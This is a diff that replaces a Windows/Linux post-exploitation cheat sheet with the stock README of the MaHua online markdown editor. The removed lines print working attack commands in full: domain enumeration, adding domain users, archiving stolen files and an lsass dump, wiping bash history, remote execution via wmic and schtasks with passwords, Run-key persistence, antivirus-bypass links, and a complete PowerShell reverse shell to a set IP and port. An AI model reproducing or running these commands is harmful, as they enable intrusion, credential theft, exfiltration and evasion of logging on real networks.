@@ -1,79 +1,41 @@
-===========scan 
+![mahua](mahua-logo.jpg)
+##MaHua是什么?
+一个在线编辑markdown文档的编辑器
 
+##MaHua有哪些功能？
 
+* 方便的`导入导出`功能
+    *  直接把一个markdown的文本文件拖放到当前这个页面就可以了
+    *  导出为一个html格式的文件，样式一点也不会丢失
+* 编辑和预览`同步滚动`，所见即所得（右上角设置）
+* `VIM快捷键`支持，方便vim党们快速的操作 （右上角设置）
+* 强大的`自定义CSS`功能，方便定制自己的展示
+* 有数量也有质量的`主题`,编辑器和预览区域
+* 完美兼容`Github`的markdown语法
+* 预览区域`代码高亮`
+* 所有选项自动记忆
 
-========Domain control
-net user 
-net user /domain 
-net group /domain 
-net view /domain 
-net group "domain admins" /domain 
-net localgroup administrators /domain 
-net user username password /add /domain 
-net time /domain 
-net view /domain 
-net localgroup administrators workgroup\test123 /add 
-net group "domain controllers" /domain 
+##有问题反馈
+在使用中有任何问题，欢迎反馈给我，可以用以下联系方式跟我交流
 
-dsquery computer 
-dsquery contact 
-dsquery group 
-dsquery user 
-dsquery subnet 
-dsquery server 
+* 邮件(dev.hubo#gmail.com, 把#换成@)
+* 微信:jserme
+* weibo: [@草依山](http://weibo.com/ihubo)
+* twitter: [@ihubo](http://twitter.com/ihubo)
 
-===============information package
-7z.exe -r -v6m -padmin a c:\test.7z C:\AppServ\www\import*.* 
-7z.exe x -padmin test.7z.001 -oc:\xl
+##捐助开发者
+在兴趣的驱动下,写一个`免费`的东西，有欣喜，也还有汗水，希望你喜欢我的作品，同时也能支持一下。
+##感激
+感谢以下的项目,排名不分先后
 
-Rar.exe a -r -v6m -padmin -m3 -x*.txt -ta c:\test.rar C:\AppServ\www\import*.* 
-Rar.exe x -padmin c:\test.part01.rar c:\xl 
+* [ace](http://ace.ajax.org/)
+* [jquery](http://jquery.com)
 
-makecab /d compressiontype=lzx C:\Users\lsass.txt C:\Users\lsass.cab >> C:\Users\info.txt
-expand.exe lsass.cab -f:* .
+##关于作者
 
-================log clear
-wc -l ~/.bash_history
-sed -i '73,$d' ~/.bash_history
-tail -10f ~/.bash_history
-
-==================remote execute
-wmic /node:192.168.1.1 /user:administrator /password:"passwd" /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
-wmic /node:192.168.1.1 /user:administrator /password:"passwd" os get Caption,OSArchitecture,Version
-wmic /node:192.168.1.1 /user:administrator /password:"passwd" product list brief |more
-wmic /node:192.168.1.1 /user:administrator /password:"passwd" process list brief |more
-wmic /node:192.168.1.1 /user:administrator /password:"passwd" startup list brief |more
-wmic /node:192.168.1.1 /user:administrator /password:"passwd" process where name="test.exe" call terminate
-
-schtasks /create /s 172.10.1.1 /u administrator /p "passwd" /ru SYSTEM /tn test /sc DAILY /tr "C:\Users\hacker.exe -a -b c" /F & schtasks /run /s 172.10.1.1 /u administrator /p "passwd" /tn test /i & schtasks /delete /s 172.10.1.1 /u administrator /p "passwd" /tn test /f
-
-
-================powershell
-change file time
-powershell.exe -command "Get-ChildItem -Path C:\ -Recurse –Include .txt,.doc,.xls,.pdf,.ppt,.docx,.xlsx,.pptf,.csv,.lnk | Where-Object { $.LastWriteTime -ge '02/01/2019 00:00:00' -AND $.LastWriteTime -le '10/27/2022 00:00:00'} | Copy-Item -Force -Destination C:\Users"
-
-write file
-powershell.exe -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("......")) | Set-Content testfoo.txt"
-
-----------reverse tcp shell
-nc -lvp 6666
-
-powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.10.139',6666);$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-----------
-
-================BypassAV
-https://github.com/TideSec/BypassAntiVirus
-https://github.com/clinicallyinane/shellcode_launcher/
-https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html
-
-
-
-
-================Persistence
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v test /t REG_SZ /d "rundll32.exe "C:\Users\test\test.dll" Test"
-reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "test" /f
+```javascript
+var ihubo = {
+  nickName  : "草依山",
+  site : "http://jser.me"
+}
+```
